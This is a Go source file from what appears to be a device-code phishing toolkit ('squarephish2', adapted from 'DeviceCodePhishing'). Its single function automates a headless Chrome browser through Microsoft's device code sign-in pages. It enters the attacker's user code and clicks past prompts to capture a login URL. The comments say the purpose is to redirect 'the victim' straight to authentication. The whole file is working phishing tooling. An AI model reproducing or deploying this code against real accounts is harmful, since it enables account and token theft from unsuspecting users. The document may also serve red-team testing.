package server

// ------------------------------------------------------------------------
// https://github.com/denniskniep/DeviceCodePhishing
// https://github.com/denniskniep/DeviceCodePhishing/blob/main/LICENSE
//
// Copyright 2025 Dennis Kniep
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// 	http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
// ------------------------------------------------------------------------

import (
	"context"
	"log/slog"

	"github.com/chromedp/cdproto/cdp"
	"github.com/chromedp/chromedp"
	"github.com/nromsdahl/squarephish2/internal/models"
)

// EnterDeviceCodeWithHeadlessBrowser will pull through the device code flow to retrieve the final URL
// and redirect the victim directly to authentication.
// Parameters:
//   - deviceCode: The device code response object.
//   - requestConfig: The request configuration.
//
// It returns the final URL or an error if the device code flow fails.
//
// https://github.com/denniskniep/DeviceCodePhishing/blob/main/pkg/entra/devicecode.go#L101
func EnterDeviceCodeWithHeadlessBrowser(deviceCode models.DeviceCodeResponse, requestConfig models.RequestConfig) (string, error) {
	var ctx context.Context
	var cancel context.CancelFunc

	allocatorOpts := chromedp.DefaultExecAllocatorOptions[:]
	allocatorOpts = append(allocatorOpts, chromedp.Flag("headless", true))
	allocatorOpts = append(allocatorOpts, chromedp.UserAgent(requestConfig.UserAgent))
	ctx, _ = chromedp.NewExecAllocator(context.Background(), allocatorOpts...)

	var contextOpts []chromedp.ContextOption
	contextOpts = append(contextOpts, chromedp.WithDebugf(slog.Debug))
	ctx, cancel = chromedp.NewContext(ctx, contextOpts...)

	defer cancel()

	var finalUrl string
	var aadTitleHint []*cdp.Node
	err := chromedp.Run(ctx,
		chromedp.Navigate(deviceCode.VerificationURI),

		chromedp.WaitVisible(`#idSIButton9`),
		chromedp.SendKeys(`#otc`, deviceCode.UserCode),
		chromedp.Click(`#idSIButton9`),

		chromedp.WaitVisible(`#cantAccessAccount`),
		chromedp.Click(`#cantAccessAccount`),

		chromedp.WaitVisible(`#aadTitleHint, #ContentPlaceholderMainContent_ButtonCancel`),
		chromedp.Nodes(`aadTitleHint`, &aadTitleHint, chromedp.AtLeast(0)),
	)
	if err != nil {
		return "", err
	}

	if len(aadTitleHint) > 0 {
		err := chromedp.Run(ctx,
			chromedp.WaitVisible(`#aadTitleHint`),
			chromedp.Click(`#aadTitleHint`),
		)
		if err != nil {
			return "", err
		}
	}

	err = chromedp.Run(ctx,
		chromedp.WaitVisible(`#ContentPlaceholderMainContent_ButtonCancel`),
		chromedp.Click(`#ContentPlaceholderMainContent_ButtonCancel`),

		chromedp.WaitVisible(`#cantAccessAccount`),
		chromedp.Location(&finalUrl),
	)
	if err != nil {
		return "", err
	}

	return finalUrl, nil
}
